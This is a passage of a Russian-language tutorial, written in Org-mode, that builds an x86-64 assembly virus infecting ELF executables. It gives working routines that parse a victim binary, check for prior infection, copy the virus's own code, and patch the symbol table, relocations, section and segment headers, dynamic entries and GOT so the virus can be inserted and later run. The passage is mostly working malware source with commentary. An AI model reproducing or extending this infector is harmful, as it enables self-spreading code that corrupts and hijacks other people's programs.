  _get_victim_code_addr_and_size_with_bind_now_exit:
      pop     %rsi
      pop     %rdi
      pop     %rdx
      pop     %rcx
      ret

#+END_SRC

Теперь ищем таблицу символов. Она хранит в себе информацию о всех
символах программы: каждая запись - это имя символа и адрес, по которому
он объявлен.

К счастью, эта секция имеет специфический тип - ее заголовок будет иметь
тип №2. Так что можно просто пройтись по таблице секций и найти ее
заголовок. Если нашли, то сохраняем адрес ее заголовка и высчитываем
количество записей в ней.

~symtab~ приходится искать, потому что в будущем мы подвергнем ее
редактированию: если не отредактировать адреса в ней, то загрузчик/линкер может
работать некорректно.

#+NAME: _find_symtab
#+BEGIN_SRC asm
  /// FIND_SYMTAB_CODE
  /// Ищет среди всех заголовков секций заголовк symtab - этот заголовок описывает
  /// таблицу символов. Ищем по типу заголовка -
  /// у symtab этот тип 2, symtab может быть
  /// в файле в единственном числе
  /// PARAMS:
  /// RDI - указатель нa таблицу заголвоков секций
  /// RSI - количество заголовков
  _find_symtab:
      push    %rcx
      push    %rdx
      push    %rdi
      push    %rsi

      mov     victim_shdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je      _find_symtab_fail

      mov     victim_shdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _find_symtab_fail

  _find_symtab_cycle:
      mov     %rdi, %rsi
      mov     SHDR_SH_TYPE(%rdi), %rdx

      cmp     $0x2, %rdx   # shdr = symtab?
      je      _find_symtab_success

      add     $0x40, %rsi
      mov     %rsi, %rdi
      loop    _find_symtab_cycle

  _find_symtab_success:
      leaq    symtab_shdr_addr(%rip), %rdi
      mov     %rsi,  (%rdi)

      // считаем кол-во записией в symtab
      // symtab size / symtab record size = rec. amount
      mov      SHDR_SH_SIZE(%rsi), %rdx
      mov      $0x18, %ecx
      movl     %edx, %eax
      xor      %rdx, %rdx
      idivl    %ecx

      leaq    symtab_records_amount(%rip), %rdi
      mov     %rax, (%rdi)

      xor     %rax, %rax
      jmp     _find_symtab_exit

  _find_symtab_fail:
      mov     $-1, %rax

  _find_symtab_exit:
      pop     %rsi
      pop     %rdi
      pop     %rdx
      pop     %rcx
      ret

#+END_SRC

Так же нам хорошо бы знать ~виртуальный~ адрес кода жертвы - т.е. кода,
который начинается сразу после таблицы заголовков сегментов.

Зачем?
Дело в том, что секция ~dynamic~ содержит в себе разные записи: некоторые
выглядят как "имя секции - адрес секции", а другие как "имя секции -
размер записи в секции". При редактировании мы хотим как-то отличать
адреса от размеров, а сделать это не никакой возможности: и то, и то -
цифры, а ставить кучу условий вроде "если тип записи такой-то, то не
редактировать запись" очень накладно: если секция ~dynamic~ чуть
изменится, то функцию по редактированию придется переписывать.

И вот именно поэтому нам нужен виртуальный адрес кода жертвы. Мы не будем
редактировать значения меньше него, считая их размером, а не адресом,
поскольку ~dynamic~ не описывает таблицу заголовков сегментов или
заголовк эльфа - а до кода жертвы находятся только они.

#+NAME: _count_victim_code_begin_vaddr
#+BEGIN_SRC asm
  /// _COUNT_VICTIM_CODE_BEGIN_VADDR
  /// считает виртуальный адрес кода жертвы
  _count_victim_code_begin_vaddr:
      push    %rdx
      push    %rdi
      push    %rsi

      mov    victim_code_offset(%rip), %rdx
      test    %rdx, %rdx
      je     _count_victim_code_begin_vaddr_fail

      mov    first_seg_vaddr(%rip), %rdi
      // test   %rdi, %rdi
      // je     _count_victim_code_begin_vaddr_fail

      add    %rdx, %rdi

      leaq   victim_code_frm_begin_vaddr(%rip), %rsi
      mov    %rdi, (%rsi)
      xor    %rax, %rax
      jmp     _count_victim_code_begin_vaddr_exit

  _count_victim_code_begin_vaddr_fail:
      mov     $-1, %rax

  _count_victim_code_begin_vaddr_exit:
      pop    %rsi
      pop    %rdi
      pop    %rdx
      ret
#+END_SRC

Ну и фишенка на торте парсинга - это поиск заголовка первой же секции
~text~ жертвы.
Нам он нужен только для того, чтоб вытащить значение его поля ~sh_name~ -
это поле содержит в себе индекс, который указывает на строку в таблице
строк ~strtab~, именно благодаря этому можно увидеть названия секций в
выводе ~readelf~. Нам нужен этот индекс при генерации заголовка секци
вируса - так мы можем сослаться на уде существующее имя, а не вписывать
дополнительную строку в таблицу строк.

Обычно в первой секции ~text~ находится точка входа. Так что нам нужена
секция, чей виртуальный адрес будет <= адреса entry point, и виртуальный
адрес конца будет >= entry_point.

#+NAME: _find_symtab
#+BEGIN_SRC asm
  /// _FIND_VICTIM_TEXT_SECTION
  /// находит секцию text для заражения -
  /// этот сегмент содержит e_entry
  // Как понять, что сегмент содержит e_entry:
  // его sh_addr <= e_entry,
  // его sh_addr + sh_size > e_entry
  /// Этот заголовко секции  нужен, чтоб прочитать его sh_name -
  /// индекс в таблице строк, его же присвоим новому заголовку
  /// секции вируса

      .globl  _find_victim_text_section
      .type	_find_victim_text_section, @function
  _find_victim_text_section:
      push    %rbx
      push    %rcx
      push    %rdx
      push    %rdi
      push    %rsi

      // проверяем наличие необходимых для посика данных
      mov     victim_elf_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _find_victim_text_section_fail

      mov     ELF_E_ENTRY(%rdi), %rdx

      mov     victim_shdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _find_victim_text_section_fail

      mov     victim_shdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je      _find_victim_text_section_fail

  _find_victim_text_section_cycle:
      mov     %rdi, %rax
      mov     SHDR_SH_ADDR(%rdi), %rbx     # получаем поле sh_addr

      cmp     %rdx, %rbx  # addr долен быть <= e_entry
      jg      _next_iter_find_text

      mov    %rax, %rdi
      mov    SHDR_SH_SIZE(%rdi), %rsi # размер текущего секц.

      add    %rsi, %rbx   # адрес конца текущeго сегмент

      cmp    %rdx, %rbx   # cur sect. end > e_entry
      jl     _next_iter_find_text

      jmp    _find_text_success   # section is found
  _next_iter_find_text:

      add     $0x40, %rax
      mov     %rax, %rdi

      loop    _find_victim_text_section_cycle
      jmp     _find_victim_text_section_fail

  _find_text_success:
      leaq    sh_name_indx(%rip), %rcx
      movl    (%rax), %edx
      movl    %edx, (%rcx)  # save sect. sh_name
      xor     %rax, %rax
      jmp     _find_text_exit

  _find_victim_text_section_fail:
      mov     $-1, %rax

  _find_text_exit:
      pop     %rsi
      pop     %rdi
      pop     %rdx
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC

 Технически, можно было бы в начале находить первую секцию ~text~, а
 затем проверять, инфицирован ли файл - не пришлось бы проходить циклом
 по всем секциями типа ~PROGBITS~. Но это будет действовать только в том
 случае, если управление всегда будет сначала передаваться на вирус, а
 потом на жертву, а не наоборот. Так что безопаснее проверить все
 секции.

 Ну и теперь можно собрать общий алгоритм парсинга.

 Он действует следующим образом:
- открыть и смапить файл в память, сохранить адрес
- проверить, эльф ли это
- получить информацию о заголовках секций жертвы
- проверить, инфицирован ли файл
- получить  заголовках сегментов жертвы
- найти виртуальный адрес первого загружаемого сегмента кода
- найти виртуальный адрес и выравнивание последнего сегмента кода
- найти секцию dynamic
- если секция dynamic есть, то проверить наличие в ней записи ~BIND_NOW~,
найти записть о ~GOT~, получить о ней информацию, высчитать адрес ~GOT~ в
смапенном файле. Противном случае сразу отправиться считать адрес и
размер кода жертвы
- посчитать адрес и размер кода жертвы (способ отличается, в зависимостри
  от того, вставляем мы ~BIND_NOW~ или нет, см. выше)
- найти текстовую секцию жертвы и сохранить ее индекс в таблице строк
- найти таблицу символов
- высчитать виртуальный адрес начала кода жертвы

Большинство этапов критично важны - поэтому после почти каждого
проверяется значения в ~rax~. Если оно отрицательное, то в большинстве
случаев это означает файл парсинга. Тогда придется парсить жертву.
В ином случае отрицательное значение показывает, что способ, которым мы
получаем информацию, не подходит для данного кейса - например, мы
пытаемся посчитать адрес и размер кода жертвы так, как будто ~BIND_NOW~
не вставляется, хотя это не так. Тогда мы пробуем иной сопособ (если
есть) и если уж не сработал и он, тогда это является фэйлом парсинга.
#+NAME: _parse_victim
#+BEGIN_SRC asm
  /// _PARSE_VICTIM
  /// Вызывает парсинг жертвы
  /// В случае провала возвращ -1
  _parse_victim:
      call    _get_victim_addr
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _is_it_elf
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _get_shdrs_info
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _check_file_infection
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _get_phdrs_info
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _find_first_seg_vaddr
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _find_last_seg_vaddr
      test    %rax, %rax
      jne     _parse_victim_fail

      call     _find_dynamic
      test    %rax, %rax
      jne      _get_victim_code

  _check_bind_now:
      call    _find_bind_now_record
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _find_got_section_vaddr
      test    %rax, %rax
      jne     _get_victim_code

      call    _find_got_section_im_memory

  _get_victim_code:
      call    _get_victim_whole_code_addr_and_size
      test    %rax, %rax
      je      _find_first_text_section

      call    _get_victim_code_addr_and_size_with_bind_now
      test    %rax, %rax
      jne     _parse_victim_fail

  _find_first_text_section:
      call    _find_victim_text_section
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _find_symtab
      test    %rax, %rax
      jne     _parse_victim_fail

      call    _count_victim_code_begin_vaddr
      test    %rax, %rax
      jne     _parse_victim_fail

  _parse_victim_success:
      movq    $0, parse_success(%rip)
      xor     %rax, %rax
      jmp     _parse_victim_exit

  _parse_victim_fail:
      mov   $-1, %rax

  _parse_victim_exit:
      ret

#+END_SRC

*** Получаем код вируса

Итак, если парсинг жертвы прошел удачно и и функция ~parse_victim~
вернула 0 и его же установила в переменную ~parse_success~, можно
получить информацию о вирусе.

Все, что нам нужно - это исполняемый код от метки ~_start~ вируса до
метки ~global_exit~, поскольку вместо ~global_exit~ мы будем вписывать
блок передачи управления на жертву.

Так что нам нужен просто адрес ~start~ в памяти и посчитать размер кода
от ~_start~ до ~_global_exit~. Поскольку вирус уже загружен в память -
программа же исполняется - то даже не придется использовать ~mmap~.

Размер кода вируса мы посчитаем как расстояние от ~_start~ до
~global_exit~ + размер блока кода, который передаст управлени на жертву.
Во-первых, даже по логике передача управления на жертву - это все еще
часть вируса, а во вторых размер вируса часто будет фигурировать во время
редактирования заголовков жертвы или иной информации в ней и легко
забыть, что после основного кода вируса будет еще и блок передачи
управления.
#+NAME:  _get_virus_code
#+BEGIN_SRC asm
  /// _GET_VIRUS_CODE
  ///
  /// Читает указатель начала кода вируса и размер этого
  /// кода.
  /// Записывает адрес кода вируса в virus_code_addr и
  /// размер этого кода в virus_code_size
  _get_virus_code:
      push    %rdi
      push    %rsi

      leaq    _start(%rip), %rdi  # начало вируса
      mov     %rdi, virus_code_addr(%rip)

      leaq    _global_exit(%rip), %rsi
      sub     %rdi, %rsi  # virus size до exit_victim

      # exit + размер блока передачи управления
      mov     transfer_control_code_size(%rip), %rax
      add     %rax, %rsi

      leaq    virus_code_size(%rip), %rdi
      mov     %rsi, (%rdi)

  _get_virus_code_success:
      xor     %rax, %rax
      movq    $0, get_virus_success(%rip)

      pop     %rsi
      pop     %rdi
      ret
#+END_SRC

*** Редактируем жертву

Если предыдущие два этапа - парсинг жертвы и получение кода вируса -
завершились успехом, то самое время отредактировать жертву.

Отредактировать предстоит достаточно много:
- отредактировать в заголовках сегментов/секций поля, отвечающие за
  смещение сегмента/секции в файле и виртуальные адреса сегмента/секции.
Если этого не сделать, то загрузчик загрузит программу по старым
адресам.

- отредактировать виртуальные адреса в записях секции ~dynamic~.
Если этого не сделать, то линкер не найдет необходимые ему секции кода, и
мы получим сегфолт еще до передачи управления на саму программу

- отредактировать виртуальные адреса в записях секции ~rela~.
В этих записях указано, что и как делать с релокейтами, а виртуальные
адреса указывают, куда нужно положить новый адрес, который будет
указывать на код библиотеки.
Если этого не сделать, то линкер положит новый адрес не туда, что
приведет к сегфолту.

- отредактировать виртуальные адреса в записях в таблицы ~GOT~.
Если не сделать этого, в работе линкера опять могут возникнуть проблемы

- отредактировать виртуальные адреса в записях таблицы символов
Это делается по той же причине, по которой мы редактируем ~GOT~.

- отредактировать заголовок эльфа жертвы
В нем нужно указать новую точку входа, смещение до заголовков секций, и
изменить поля, отвечающие за количество заголовков таблиц заголовоков
секций и сегментов.

Сначала отредактируем записи в таблице символов ~symtab~.
Редактирование происходит просто: все виртуальные адреса (кроме тех, что
установлены в 0) будут смещены на 56 байт (размер заголовка сегмента
вируса), а те, что находятся ниже секции ~dynamic~ в файле и в памяти,
будут смещены на 56 байт + содержимое переменной
~new_bind_now_flag_record_size~, чтоб учесть возможное расширения секции
~dynamic~.
#+NAME: _recount_symbols_addrs
#+BEGIN_SRC asm
  /// _RECOUNT_SYMBOLS_ADDRS
  /// Редактирует vaddr символов
  _recount_symbols_addrs:
      push     %rcx
      push     %rbx
      push     %rdx
      push     %r8
      push     %rdi
      push     %rsi

      // проверяем необходимые данные
      mov     symtab_shdr_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _recount_symbols_addrs_fail

      mov     symtab_records_amount(%rip), %rcx
      test    %rcx, %rcx
      je      _recount_symbols_addrs_fail

      mov     victim_elf_addr(%rip), %rsi
      test    %rsi, %rsi
      je      _recount_symbols_addrs_fail


      mov     dynamic_records_vaddr(%rip), %r8

      // указатель на первую запись в symtab
      add     $0x18, %rdi
      add     (%rdi), %rsi
      mov     %rsi, %rdi

      mov     new_bind_now_flag_record_size(%rip), %rbx

      // константа, на которую увеличиваются
      // виртуальные адреса
      mov     $0x38, %rdx

  _recount_symbols_addrs_cycle:
      add     $0x8, %rdi   # offset до vaddr символа

      cmp     $0, (%rdi)
      je      _recount_symbols_next_iter

      cmp     %r8, (%rdi)
      jle     _add_const_symtab

      add     %rbx, (%rdi)  # сместили на разм. +1 dyn. record

  _add_const_symtab:
      add     %rdx, (%rdi)  # сместили на разм. virus phdr

  _recount_symbols_next_iter:
      add     $0x10, %rdi
      loop    _recount_symbols_addrs_cycle

      xor     %rax, %rax
      jmp     _recount_symbols_addrs_exit

  _recount_symbols_addrs_fail:
      mov    $-1, %rax

  _recount_symbols_addrs_exit:
      pop     %rsi
      pop     %rdi
      pop     %r8
      pop     %rdx
      pop     %rbx
      pop     %rcx
      ret

#+END_SRC

Ровно по тому же принципу мы редактируем секции ~rela~ с одним небольшим
дополнением. Дело в том, что секций типа ~rela~ может быть
несколько, сколько - нам неизвестно заранее. Поэтому проще находить их и
сразу редактировать, чем искать, сохранять их адреса в смапенном файле в
какой-то буфер, а потом редактировать.

Так что мы последовательно проходимя по заголовкам секций и если
заголовок имеет типа 4 - типа ~rela~ - то мы редактируем конкретно эту
секцию, а потом возвращаемся к циклу и ищем секции ~rela~ дальше. Важно
отредактировать секции ~rela~ ~до~ того, как будут отредатрованы
заголовки всех секций - в противном случае мы просто не найдем секции ~rela~
в смапенной памяти из-за отредактированных смещений.

Функция ~_recount_rela_sections~ ищет заголовки секциий ~rela~ и вызывает
редактирование самих секций.
#+NAME: _recount_rela_sections
#+BEGIN_SRC asm
  /// _RECOUNT_RELA_SECTIONS
  /// Находит все секции типа rela
  /// и вызывает их пересчитывание
  _recount_rela_sections:
      push  %rbx
      push  %rdx
      push  %rcx

      mov     victim_shdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je     _recount_rela_sections_fail

      mov     victim_shdr_table_addr(%rip), %rdx
      test    %rdx, %rdx
      je     _recount_rela_sections_fail

  _recount_rela_sections_cycle:
      add     $0x4, %rdx        # проверяем тип
      cmp     $0x4, (%rdx)      # тип rela?
      jne     _recount_rela_sections_next

      sub     $0x4, %rdx
      mov     SHDR_SH_OFFSET(%rdx), %rbx
      mov     %rbx, rela_section_offset(%rip)

      mov     SHDR_SH_SIZE(%rdx), %rbx
      mov     %rbx, rela_section_size(%rip)

      call    _recount_rela_current_section

      test    %rax, %rax
      jne     _recount_rela_sections_fail

      add     $0x4, %rdx
  _recount_rela_sections_next:
      add     $0x3C, %rdx
      loop    _recount_rela_sections_cycle

  _recount_rela_sections_success:
      xor     %rax, %rax
      jmp     _recount_rela_sections_exit

  _recount_rela_sections_fail:
      mov     $-1, %rax

  _recount_rela_sections_exit:
      pop     %rcx
      pop     %rdx
      pop     %rbx
      ret

#+END_SRC

А функция ~_recount_rela_current_section~ пересчитывает виртуальные
адреса в записях секции.
#+NAME: _recount_rela_current_section
#+BEGIN_SRC asm
  /// _RECOUNT_RELA_CURRENTSECTION
  /// увеличивает vaddr релокейта на заданную величину
  _recount_rela_current_section:
      push    %rbx
      push    %rcx
      push    %rdx
      push    %r8
      push    %rdi
      push    %rsi

      // проверяем данные, необходимые
      // для редактирования
      mov     rela_section_offset(%rip), %rdi
      test    %rdi, %rdi
      je     _recount_rela_current_section_fail

      mov     dynamic_records_vaddr(%rip), %r8
      test    %r8, %r8
      je     _recount_rela_current_section_fail

      mov     victim_elf_addr(%rip), %rax
      test    %rax, %rax
      je     _recount_rela_current_section_fail

      mov     rela_section_size(%rip), %rax
      test    %rax, %rax
      je     _recount_rela_current_section_fail

      // посчитали кол-во записей
      // в секции rela
      xor     %rdx, %rdx
      mov     $0x18, %ecx
      idiv    %ecx
      mov     %eax, %ecx

      // кладем константу, на которую
      // увеличиваются адреса и смещения
      mov     $0x38, %rsi

      //  получили адрес кода секции в памяти
      mov     victim_elf_addr(%rip), %rax
      add     %rdi, %rax

      mov     new_bind_now_flag_record_size(%rip), %rbx

  _recount_rela_current_section_cycle:
      cmp     $0, (%rax)
      je      _recount_rela_current_next_iter

      cmp     %r8, (%rax)
      jle     _add_const_to_rela

      // vaddr релокейта + размер новой записи
      // dynamic
      add     %rbx, (%rax)

      // vaddr релокейта + константа
  _add_const_to_rela:
      add     %rsi, (%rax)

  _recount_rela_current_next_iter:
      add     $0x18, %rax   # сдвиг на след. запись
      loop   _recount_rela_current_section_cycle

      xor     %rax, %rax
      jmp     _recount_rela_current_section_exit

  _recount_rela_current_section_fail:
      mov     $-1, %rax

  _recount_rela_current_section_exit:
      pop     %rsi
      pop     %rdi
      pop     %r8
      pop     %rdx
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC

Теперь можно отредактировать заголовки секций. Редактируем их по уже
известному принципу: если виртуальный адрес или смещение больше смещения
или виртуального адреса секции ~dynamic~, то они увеличиваются на 56
байт + содержимое переменной ~new_bind_now_flag_record_size~. Если же
виртуальный адрес или смещение нулевые, то они не редактируеются.

#+NAME: _shdr_offset_and_addr_recount
#+BEGIN_SRC asm
  /// _SHDR_OFFSET_AND_ADDR_RECOUNT
  /// Пересчитывает адреса и смещения в заголовках, если они не 0
  /// Поскольку секция dynamic может расширяться (в заивимости от того,
  /// выставлен в ней флаг BIND_NOW компилером или нет),
  /// то код, который находится
  /// ниже секции dynamic должен сместиться, учитывая это расширение
      .globl  _shdr_offset_and_addr_recount
      .type	_shdr_offset_and_addr_recount, @function

  _shdr_offset_and_addr_recount:
      push  %rbx
      push  %rdx
      push  %rcx
      push  %r8
      push  %rdi
      push  %rsi

      // проверяем необходимые данные
      mov     victim_shdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je     _shdr_offset_and_addr_recount_fail

      mov     victim_shdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je     _shdr_offset_and_addr_recount_fail

      mov     new_bind_now_flag_record_size(%rip), %rbx
      mov     $0x38, %rdx

  _shdr_offset_and_addr_recount_cycle:

      add     $0x10, %rdi       # смещение до поля sh_addr
      cmp     $0,   (%rdi)      # sh_addr <= 0?

      jle     _recount_shdr_offset

      // секция расположенаа до dynamic?
      mov     dynamic_records_vaddr(%rip), %rax
      cmp   %rax, (%rdi)
      // да
      jle     _add_const_to_addr

      // нет, скорректировать в соответствии
      // с возможным расширением dynamic
      add     %rbx, (%rdi)

  _add_const_to_addr:
      add     %rdx, (%rdi)

  _recount_shdr_offset:
      add     $0x8, %rdi
      cmp     $0, (%rdi)

      jle     _next_iter_recount

      // секция расположена до dynamic?
      mov     dynamic_records_offset(%rip), %rax
      cmp     %rax, (%rdi)

      jle     _add_const_to_offset

      // нет, скорректировать в соответствии
      // с возможным расширением dynamic
      add     %rbx, (%rdi)

  _add_const_to_offset:
      add     %rdx, (%rdi)   # пересчитываем смещение

  _next_iter_recount:
      add     $0x28, %rdi    # смещение до след. заголовка
      loop    _shdr_offset_and_addr_recount_cycle

  _shdr_offset_and_addr_recount_success:
      xor     %rax, %rax
      jmp     _shdr_offset_and_addr_recount_exit

  _shdr_offset_and_addr_recount_fail:
      mov      $-1, %rax

  _shdr_offset_and_addr_recount_exit:
      pop      %rsi
      pop      %rdi
      pop      %r8
      pop      %rcx
      pop      %rdx
      pop      %rbx
      ret

#+END_SRC

Теперь отредактируем заголовки сегментов.
Они редактируются ровно так же, как заголовки секций, но с парой
небольших дополнений.

Самый первый заголовок сегмента описывает всю таблицу заголовков секций:
он расположен ~до~ всех прочих заголовков, а следовательно, будет
расположен до нового заголовка вируса или секции ~dynamic~, поэтому его
смещение или виртуальный адрес не изменятся. Зато изменится размер: раз
мы вставляем новый заголовок, то вся таблица увеличится на 56 байт.

А так же у нас есть заголовок сегмента ~DYNAMIC~ - в него входит секция
~dynamic~, которая, как мы помним, может расширяться на дополнительую
запись. Поэтому встретив этот заголовок, мы отредактируем не только адрес
и смещение, но и размер на содержимое переменной
~new_bind_now_flag_record_size~.

#+NAME: _phdr_offset_and_addr_recount
#+BEGIN_SRC asm
  /// _PHDR_OFFSET_AND_ADDR_RECOUNT
  /// Поскольку секция dynamic может расширяться (в заивимости от того,
  /// выставлен в ней флаг BIND_NOW компилером или нет),
  /// то код, который находится
  /// ниже секции dynamic должен сместиться, учитывая это расширение
  _phdr_offset_and_addr_recount:
      push    %rbx
      push    %rdx
      push    %rcx
      push    %r8
      push    %r9
      push    %rdi
      push    %rsi

      // проверяем данные,
      // необходимые для редактирования
      mov     victim_phdr_amount(%rip), %rcx
      test    %rcx, %rcx
      je     _phdr_offset_and_addr_recount_fail

      mov     victim_phdr_table_addr(%rip), %rdi
      test    %rdi, %rdi
      je     _phdr_offset_and_addr_recount_fail

      mov     first_seg_vaddr(%rip), %rsi
      // test    %rsi, %rsi
      // je     _phdr_offset_and_addr_recount_fail

      mov     new_bind_now_flag_record_size(%rip), %rbx
      mov     $0x38, %rdx

  _phdr_offset_and_addr_recount_cycle:
      mov     dynamic_records_vaddr(%rip), %r8

      movl    (%rdi), %eax

      // это заголовок самой таблицы заголовков?
      cmp     $0x6,  %rax
      je      _edit_phdr_table_header
      // это заголовок сегмента dynamic?
      cmp     $0x2,  %rax
      jne     _phdr_offset_and_addr_check

      // расширяем dynamic на размер
      // вставляемой записи
      add     $0x20, %rdi
      add     %rbx, (%rdi)

      add     $0x8, %rdi
      add     %rbx, (%rdi)

      sub     $0x28,  %rdi
      jmp     _phdr_offset_and_addr_check

  _edit_phdr_table_header:
      // редактируем поля p_filesz
      // и p_memsz в заголовке таблицы сегментов
      // заголовков станет на один больше, значит,
      //  размер таблицы надо увеличить на 56 байт
      add     $0x20, %rdi
      add     %rdx, (%rdi)

      add     $0x8, %rdi
      add     %rdx, (%rdi)

      sub     $0x20, %rdi
      jmp     _next_iter_recount_phdr

  _phdr_offset_and_addr_check:
      add     $0x10, %rdi    # проверяем адрес

      cmp     %rsi, (%rdi)
      je      _edit_first_segm_header

      cmp     $0,  (%rdi)
      jle     _recount_offset

      jmp     _recount_vaddr_paddr

  _edit_first_segm_header:
      // это первый сегмент кода -
      // содерит в себе заголовки
      // увеличить его p_memsz и p_filesz
      // на размер добавляемого заголвока
      // а вот его vaddr,paddr и offset
      // не редактируем - новый заголвок
      // будет вписан В него, а не ДО
      // него
      add     $0x10, %rdi
      add     %rdx, (%rdi)

      add     $0x8, %rdi
      add     %rdx, (%rdi)

      sub     $0x20, %rdi

      jmp     _next_iter_recount_phdr

  _recount_vaddr_paddr:
      cmp     %r8, (%rdi)
      jle     _add_const_to_vaddr_paddr

      add     %rdx, (%rdi)    # recount vaddr and paddr
      add     %rbx, (%rdi)

      add     $0x8, %rdi
      add     %rdx, (%rdi)
      add     %rbx, (%rdi)

      sub     $0x8, %rdi

      jmp     _recount_offset
  _add_const_to_vaddr_paddr:
      add     %rdx, (%rdi)    # recount vaddr and paddr

      add     $0x8, %rdi
      add     %rdx, (%rdi)

      sub     $0x8, %rdi

  _recount_offset:
      mov     dynamic_records_offset(%rip), %r8

      sub     $0x8, %rdi

      cmp     $0, (%rdi)
      jle     _next_iter_recount_phdr

      // сегмент расположен до dynamic?
      cmp     %r8, (%rdi)

      jle     _add_const_to_phdr_offset

      add     %rbx, (%rdi)
      add     %rdx, (%rdi)

      jmp     _next_iter_recount_phdr

  _add_const_to_phdr_offset:
      add     %rdx, (%rdi)

      jmp     _next_iter_recount_phdr

  _next_iter_recount_phdr:
      add     $0x30, %rdi

      dec     %rcx
      test    %rcx, %rcx
      jne     _phdr_offset_and_addr_recount_cycle

  _phdr_offset_and_addr_recount_success:
      xor     %rax, %rax
      jmp     _phdr_offset_and_addr_recount_exit

  _phdr_offset_and_addr_recount_fail:
      mov     $-1, %rax

  _phdr_offset_and_addr_recount_exit:
      pop     %rsi
      pop     %rdi
      pop     %r9
      pop     %r8
      pop     %rcx
      pop     %rdx
      pop     %rbx
      ret

#+END_SRC

Теперь редактируем виртуальные адреса в записях секции ~dynamic~.
Редактируем ровно по тому ж принципу, что и все остальное: все
виртуальные адреса увеличиваются на 56 байт + содержимое переменной
~new_bind_now_flag_record_size~, если они больше самого адреса ~dynamic~.
Если вы помните, я говорил, что записи ~dynamic~ - то не обязательно
соответствие вида "имя - адрес", но и "имя - размер". Размеры нам
редактировать не надо, так что мы сравниваем адрес с виртуальным адресом
начала кода жертвы - он идет сразу после заголовков сегментов - и все,
что меньше него, не редактируем.

#+NAME: _recount_dynamic_section
#+BEGIN_SRC asm
  /// _RECOUNT_DYNAMIC_SECTION
  /// редактирует vaddr кода, описываемого записями в dynamic,
  /// а так же находит запись GOT и сохраняет ее измененный vaddr
  _recount_dynamic_section:
      push    %rbx
      push    %rcx
      push    %rdx
      push    %r8
      push    %r9
      push    %rdi
      push    %rsi

      mov     dynamic_records_addr(%rip), %rdi
      test    %rdi, %rdi
      je      _recount_dynamic_section_fail

      mov     dynamic_records_size(%rip), %rdx
      test    %rdx, %rdx
      je      _recount_dynamic_section_fail

      mov     dynamic_records_vaddr(%rip), %r9
      test    %r9, %r9
      je      _recount_dynamic_section_fail

      mov     victim_code_frm_begin_vaddr(%rip), %r8
      test    %r8, %r8
      je      _recount_dynamic_section_fail

      mov     %edx, %eax
      xor     %rdx, %rdx
      mov     $0x10, %ecx
      idiv    %ecx
      mov     %eax, %ecx

      mov     %r8, %rdx
      mov     %rdi, %rax

      mov     new_bind_now_flag_record_size(%rip), %rbx
      mov     constant_value(%rip), %rsi
  _recount_dynamic_section_cycle:
      // запись FLAGS_1?
      cmpq    $0x6ffffffb, (%rax)
      jne     _recount_vaddr
      jmp     _skip_record

  _skip_record:
      add     $0x8, %rax
      jmp     _recount_dynamic_section_next_iter

  _recount_vaddr:
      add     $0x8, %rax  # пропустили тип

      cmp     %rdx,  (%rax)
      jle     _recount_dynamic_section_next_iter

      // код лежит после секции dynamic?
      cmp     %r9,  (%rax)
      jle     _add_const

      add     %rbx, (%rax)

  _add_const:
      // vaddr релокейта + константа
      add     %rsi, (%rax)

  _recount_dynamic_section_next_iter:
      add     $0x8, %rax    # сдвиг на след. запись
      loop    _recount_dynamic_section_cycle

  _recount_dynamic_section_success:
      xor     %rax, %rax
      jmp     _recount_dynamic_section_exit

  _recount_dynamic_section_fail:
      mov     $-1, %rax

  _recount_dynamic_section_exit:
      pop     %rsi
      pop     %rdi
      pop     %r9
      pop     %r8
      pop     %rdx
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC

Затем редактируем записи в секции ~GOT~ по тому же принципу, что
редактировали виртуальные адреса в других секциях или заголовках.
Если ноль - не редактировать, иначе увеличить на 56 байт + содержимое
переменной ~new_bind_now_flag_record_size~, если виртуальный адрес больше
виртуального адреса секции ~dynamic~

#+NAME: _recount_got_section
#+BEGIN_SRC asm
  /// _RECOUNT_GOT_SECTION
  /// редактирует записи - адреса
  /// - внутри GOT, увеличивая их на
  /// на заданную величину
  _recount_got_section:
      push    %rbx
      push    %rcx
      push    %rdx
      push    %r8

      mov     GOT_size(%rip), %rax
      test    %rax, %rax
      je      _recount_got_section_fail

      mov     GOT_addr_in_memory(%rip), %rbx
      test    %rbx, %rbx
      je      _recount_got_section_fail

      mov     dynamic_records_vaddr(%rip), %r8
      test    %r8, %r8
      je      _recount_got_section_fail

      // посчитали кол-во записей
      // в секции got
      xor     %rdx, %rdx
      mov     $0x8, %ecx
      idiv    %ecx
      mov     %eax, %ecx

      mov     %rbx, %rax
      mov     $0x38, %rbx

      mov     new_bind_now_flag_record_size(%rip), %rdx

  _recount_got_section_cycle:
      cmp     $0, (%rax)
      je      _recount_got_next_iter

      cmp     %r8, (%rax)
      jle     _add_const_to_got_record

      add     %rdx, (%rax)

  _add_const_to_got_record:

      // vaddr записи + константа
      add     %rbx, (%rax)

  _recount_got_next_iter:
      add     $0x8, %rax   # сдвиг на след. запись
      loop    _recount_got_section_cycle

      xor     %rax, %rax
      jmp     _recount_got_section_exit

  _recount_got_section_fail:
      mov     $-1, %rax

  _recount_got_section_exit:
      pop     %r8
      pop     %rdx
      pop     %rcx
      pop     %rbx
      ret

#+END_SRC

Теперь нам хорошо бы отредактировать заголовок эльфа, но сделать сразу мы
это не можем: чтоб отредактировать точку входа, нужно знать новую. А мы
ее пока не посчитали. Так что займемся именно этим: высчитаем виртуальный
адрес вируса, где он будет располагаться в инфицированной жертве.

Помните, нам нужен был виртуальный адрес и выравнивание последнего
сегмента жертвы? Вот сейчас эта информация пригодится.

